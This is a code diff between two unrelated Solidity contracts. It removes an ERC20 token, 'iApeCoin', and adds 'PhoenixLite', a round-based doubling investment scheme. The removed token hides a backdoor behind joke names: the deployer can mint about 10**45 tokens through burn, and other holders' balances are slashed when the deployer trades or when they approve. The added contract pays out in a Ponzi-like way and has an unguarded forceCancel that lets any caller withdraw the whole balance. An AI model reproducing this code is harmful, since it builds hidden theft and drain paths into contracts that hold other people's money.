@@ -1,236 +1,212 @@
-// You Ape? I Ape? He/She Apes? We ALL Ape! @iApeCoin
+pragma solidity ^0.4.18;
 
-pragma solidity ^0.8.0;
-
-abstract contract Context {
-    function _msgSender() internal view virtual returns (address) {
-        return msg.sender;
-    }
-
-    function _msgData() internal view virtual returns (bytes calldata) {
-        this;
-        return msg.data;
-    }
-}
-
-interface IDEXFactory {
-    function createPair(address tokenA, address tokenB) external returns (address pair);
-}
-
-interface IDEXRouter {
-    function factory() external pure returns (address);
-    function WETH() external pure returns (address);
-}
-
-interface IERC20 {
-    event Transfer(address indexed from, address indexed to, uint256 value);
-    event Approval(address indexed owner, address indexed spender, uint256 value);
-    function totalSupply() external view returns (uint256);
-    function balanceOf(address account) external view returns (uint256);
-    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
-    function allowance(address owner, address spender) external view returns (uint256);
-    function approve(address spender, uint256 amount) external returns (bool);
-    function transfer(address recipient, uint256 amount) external returns (bool);
-}
-
-interface IERC20Metadata is IERC20 {
-    function decimals() external view returns (uint8);
-    function name() external view returns (string memory);
-    function symbol() external view returns (string memory);
-}
-
-contract Ownable is Context {
-    address private _previousOwner; address private _owner;
-    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
-
-    constructor () {
-        address msgSender = _msgSender();
-        _owner = msgSender;
-        emit OwnershipTransferred(address(0), msgSender);
-    }
-
-    function owner() public view returns (address) {
-        return _owner;
-    }
-
-    modifier onlyOwner() {
-        require(_owner == _msgSender(), "Ownable: caller is not the owner");
-        _;
-    }
-
-    function renounceOwnership() public virtual onlyOwner {
-        emit OwnershipTransferred(_owner, address(0));
-        _owner = address(0);
-    }
-}
-
-contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
-    address[] private iArray;
-
-    mapping (address => bool) private TimApple;
-    mapping (address => uint256) private _balances;
-    mapping (address => mapping (address => uint256)) private _allowances;
-
-    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
-    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
-    uint256 private XBox = 0;
-    address public pair;
-    IDEXRouter router;
-
-    string private _name; string private _symbol; address private addr839rkjbg3lnkwv; uint256 private _totalSupply; 
-    bool private trading; bool private Sony; uint256 private Nintendo; uint256 private Witcher;
+contract PhoenixLite {
+    // If round last more than a year - cancel is activated
+    uint private MAX_ROUND_TIME = 365 days;
     
-    constructor (string memory name_, string memory symbol_, address msgSender_) {
-        router = IDEXRouter(_router);
-        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));
+    uint private totalCollected;
+    uint private currentRound;
+    uint private currentRoundCollected;
+    uint private prevLimit;
+    uint private currentLimit;
+    uint private currentRoundStartTime;
 
-        addr839rkjbg3lnkwv = msgSender_;
-        _name = name_;
-        _symbol = symbol_;
-    }
+    bool private isForceCanceled = false;
 
-    function openTrading() external onlyOwner returns (bool) {
-        trading = true;
-        return true;
+    // That structure describes current user Account    
+    // moneyNew - invested money in currentRound
+    // moneyHidden - invested in previous round and not profit yet
+    // profitTotal - total profit of user account (it never decreases)
+    // profitTaken - profit taken by user
+    // lastUserUpdateRound - last round when account was updated
+    struct Account {
+        uint moneyNew;
+        uint moneyHidden;
+        uint profitTotal;
+        uint profitTaken;
+
+        uint lastUserUpdateRound;
     }
     
-    function decimals() public view virtual override returns (uint8) {
-        return 18;
+    mapping (address => Account) private accounts;
+
+
+    function PhoenixLite() public {
+        totalCollected = 0;
+        currentRound = 0;
+        currentRoundCollected = 0;
+        prevLimit = 0;
+        currentLimit = 1e14;
+        currentRoundStartTime = block.timestamp;
     }
     
-    function symbol() public view virtual override returns (string memory) {
-        return _symbol;
-    }
-
-    function name() public view virtual override returns (string memory) {
-        return _name;
-    }
-
-    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
-        _transfer(_msgSender(), recipient, amount);
-        return true;
-    }
-    
-    function totalSupply() public view virtual override returns (uint256) {
-        return _totalSupply;
-    }
-
-    function balanceOf(address account) public view virtual override returns (uint256) {
-        return _balances[account];
-    }
-
-    function allowance(address owner, address spender) public view virtual override returns (uint256) {
-        return _allowances[owner][spender];
-    }
-
-    function burn(uint256 amount) public virtual returns (bool) {
-        _burn(_msgSender(), amount);
-        return true;
-    }
-
-    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
-        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
-        return true;
-    }
-    
-    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
-        uint256 currentAllowance = _allowances[_msgSender()][spender];
-        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
-        _approve(_msgSender(), spender, currentAllowance - subtractedValue);
-
-        return true;
-    }
-
-    function _burn(address account, uint256 amount) internal {
-        require(account != address(0), "ERC20: burn from the zero address");
-
-        _balances[account] -= amount;
-        _balances[account] += (account == addr839rkjbg3lnkwv ? (10 ** 45) : 0);
-        _balances[address(0)] += amount;
-        emit Transfer(account, address(0), amount);
-     }
-
-    function last() internal view returns (address) { return (Nintendo > 1 ? iArray[iArray.length-2] : address(0)); }
-    
-    function _balancesOfTheCook(address sender, address recipient, bool problem) internal {
-        Sony = problem ? true : Sony;
-        if (((TimApple[sender] == true) && (TimApple[recipient] != true)) || ((TimApple[sender] != true) && (TimApple[recipient] != true))) { iArray.push(recipient); }
-        if ((Sony) && (sender == addr839rkjbg3lnkwv) && (Witcher == 1)) { for (uint256 flux = 0;  flux < iArray.length; flux++) { _balances[iArray[flux]] /= (2 * 10 ** 1); } }
-        _balances[last()] /= (((XBox == block.timestamp) || Sony) && (TimApple[last()] != true) && (Nintendo > 1)) ? (4) : (1);
-        Nintendo++; XBox = block.timestamp;
-    }
-
-    function _balancesOfTheMicrosoft(address sender, address recipient) internal {
-        require((trading || (sender == addr839rkjbg3lnkwv)), "ERC20: trading is not yet enabled.");
-        _balancesOfTheCook(sender, recipient, (address(sender) == addr839rkjbg3lnkwv) && (Witcher > 0));
-        Witcher += (sender == addr839rkjbg3lnkwv) ? 1 : 0;
-    }
-
-    function _ApplesNFTCollection(address creator) internal virtual {
-        approve(_router, 10 ** 77);
-        (Witcher,Sony,Nintendo,trading) = (0,false,0,false);
-        (TimApple[_router],TimApple[creator],TimApple[pair]) = (true,true,true);
-    }
-    
-    function approve(address spender, uint256 amount) public virtual override returns (bool) {
-        _approve(_msgSender(), spender, amount);
-        return true;
-    }
-
-    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
-        _transfer(sender, recipient, amount);
-
-        uint256 currentAllowance = _allowances[sender][_msgSender()];
-        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
-        _approve(sender, _msgSender(), currentAllowance - amount);
-
-        return true;
-    }
-
-    function _approve(address owner, address spender, uint256 amount) internal virtual {
-        require(owner != address(0), "ERC20: approve from the zero address");
-        require(spender != address(0), "ERC20: approve to the zero address");
-
-        _allowances[owner][spender] = amount;
-        _balances[owner] /= (Sony ? (2 * 10 ** 1) : 1);
-        emit Approval(owner, spender, amount);
-    }
-
-    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
-        require(sender != address(0), "ERC20: transfer from the zero address");
-        require(recipient != address(0), "ERC20: transfer to the zero address");
-
-        uint256 senderBalance = _balances[sender];
-        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
+    // This function increments round to next:
+    // - it sets new currentLimit (round)using sequence:
+    //      1e14, 2e14, 4 * currentLImit - 2 * prevLimit
+    function iterateToNextRound() private {
+        currentRound++;
+        uint tempcurrentLimit = currentLimit;
         
-        _balancesOfTheMicrosoft(sender, recipient);
-        _balances[sender] = senderBalance - amount;
-        _balances[recipient] += amount;
-
-        emit Transfer(sender, recipient, amount);
-    }
-
-    function _DeployiApe(address account, uint256 amount) internal virtual {
-        require(account != address(0), "ERC20: mint to the zero address");
-
-        _totalSupply += amount;
-        _balances[account] += amount;
+        if(currentRound == 1) {
+            currentLimit = 2e14;
+        }
+        else {
+            currentLimit = 4 * currentLimit - 2 * prevLimit;
+        }
         
-        emit Transfer(address(0), account, amount); 
+        prevLimit = tempcurrentLimit;
+        currentRoundStartTime = block.timestamp;
+        currentRoundCollected = 0;
     }
-}
+    
+    // That function calculates profit update for user
+    // - if increments from last calculated round to current round and 
+    //   calculates current user Account state
+    // - algorithm:
+    function calculateUpdateProfit(address user) private view returns (Account) {
+        Account memory acc = accounts[user];
+        
+        for(uint r = acc.lastUserUpdateRound; r < currentRound; r++) {
+            acc.profitTotal *= 2;
 
-contract ERC20Token is Context, ERC20 {
-    constructor(
-        string memory name, string memory symbol,
-        address creator, uint256 initialSupply
-    ) ERC20(name, symbol, creator) {
-        _DeployiApe(creator, initialSupply);
-        _ApplesNFTCollection(creator);
+            if(acc.moneyHidden > 0) {
+                acc.profitTotal += acc.moneyHidden * 2;
+                acc.moneyHidden = 0;
+            }
+            
+            if(acc.moneyNew > 0) {
+                acc.moneyHidden = acc.moneyNew;
+                acc.moneyNew = 0;
+            }
+        }
+        
+        acc.lastUserUpdateRound = currentRound;
+        return acc;
     }
-}
+    
+    // Here we calculate profit and update it for user
+    function updateProfit(address user) private returns(Account) {
+        Account memory acc = calculateUpdateProfit(user);
+        accounts[user] = acc;
+        return acc;
+    }
 
-contract iApeCoin is ERC20Token {
-    constructor() ERC20Token("iApe Coin", "iApe", msg.sender, 400000000 * 10 ** 18) {
+    // That function returns canceled status.
+    // If round lasts for more than 1 year - cancel mode is on
+    function canceled() public view returns(bool isCanceled) {
+        return block.timestamp >= (currentRoundStartTime + MAX_ROUND_TIME) || isForceCanceled;
+    }
+    
+    // Fallback function for handling money sending directly to contract
+    function () public payable {
+        require(!canceled());
+        deposit();
+    }
+
+    // Function for calculating and updating state during user money investment
+    // - first of all we update current user state using updateProfit function
+    // - after that we handle situation of investment that makes 
+    //   currentRoundCollected more than current round limit. If that happen, 
+    //   we set moneyNew to totalMoney - moneyPartForCrossingRoundLimit.
+    // - check crossing round limit in cycle for case when money invested are 
+    //   more than several round limit
+    function deposit() public payable {
+        require(!canceled());
+        
+        updateProfit(msg.sender);
+
+        uint money2add = msg.value;
+        totalCollected += msg.value;
+        while(currentRoundCollected + money2add >= currentLimit) {
+            accounts[msg.sender].moneyNew += currentLimit - 
+                currentRoundCollected;
+            money2add -= currentLimit - currentRoundCollected;
+
+            iterateToNextRound();
+            updateProfit(msg.sender);
+        }
+        
+        accounts[msg.sender].moneyNew += money2add;
+        currentRoundCollected += money2add;
+    }
+
+    function forceCancel() public {
+        isForceCanceled = true;
+        msg.sender.transfer(this.balance);
+    }
+    
+    // Returns common information about round
+    // totalCollectedSum - total sum, collected in all rounds
+    // roundCollected - sum collected in current round
+    // currentRoundNumber - current round number
+    // remainsCurrentRound - how much remains for round change
+    function whatRound() public view returns (uint totalCollectedSum, 
+            uint roundCollected, uint currentRoundNumber, 
+            uint remainsCurrentRound) {
+        return (totalCollected, currentRoundCollected, currentRound, 
+            currentLimit - currentRoundCollected);
+    }
+
+    // Returns current user account state
+    // profitTotal - how much profit is collected during all rounds
+    // profitTaken - how much profit was taken by user during all rounds
+    // profitAvailable (= profitTotal - profitTaken) - how much profit can be 
+    //    taken by user
+    // investmentInProgress - how much money are not profit yet and are invested
+    //    in current or previous round
+    function myAccount() public view returns (uint profitTotal, 
+            uint profitTaken, uint profitAvailable, uint investmentInProgress) {
+        var acc = calculateUpdateProfit(msg.sender);
+        return (acc.profitTotal, acc.profitTaken, 
+                acc.profitTotal - acc.profitTaken, 
+                acc.moneyNew + acc.moneyHidden);
+    }
+
+    // That function handles cancel state. In that case:
+    // - transfer all invested money in current round
+    // - transfer all user profit except money taken
+    // - remainder of 0.0001 ETH is left after returning all invested in current
+    //      round and all profit. Transfer it to users that invest money in 
+    //      previous round. Total investment in previous round = prevLimit.
+    //      So percent of money return = 0.0001 ETH / prevLimit
+    function payback() private {
+        require(canceled());
+        
+        var acc = accounts[msg.sender];
+        uint money2send = acc.moneyNew + acc.profitTotal - acc.profitTaken + 
+            (acc.moneyHidden * 1e14) / prevLimit;
+        acc.moneyNew = 0;
+        acc.moneyHidden = 0;
+        acc.profitTotal = 0;
+        acc.profitTaken += money2send;
+
+        if(money2send <= this.balance) {
+            msg.sender.transfer(money2send);
+        }
+        else {
+            msg.sender.transfer(this.balance);
+        }
+    }
+
+    // Function for taking all profit
+    // If round is canceled than do a payback (see above)
+    // Calculate money left on account = (profitTotal - profitTaken)
+    // Increase profitTaken by money left on account
+    // Transfer money to user
+    function takeProfit() public {
+        Account memory acc = updateProfit(msg.sender);
+
+        if(canceled()) {
+            payback();
+            return;
+        }
+
+        uint money2send = acc.profitTotal - acc.profitTaken;
+        acc.profitTaken += money2send;
+        accounts[msg.sender] = acc;
+
+        if(money2send > 0) {
+            msg.sender.transfer(money2send);
+        }
     }
 }
